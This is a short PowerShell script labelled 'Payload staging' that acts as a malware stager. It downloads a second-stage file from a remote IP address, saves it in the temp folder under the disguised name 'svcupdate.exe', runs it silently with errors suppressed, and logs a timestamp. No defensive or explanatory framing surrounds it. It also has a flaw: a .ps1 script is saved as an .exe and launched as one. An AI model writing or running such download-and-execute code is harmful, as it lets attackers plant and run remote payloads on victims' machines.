<# Payload staging #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.125/stage2.ps1",
    [string]$WorkingPath = "$env:TEMP\svcupdate.exe"
)
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $WorkingPath)
Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
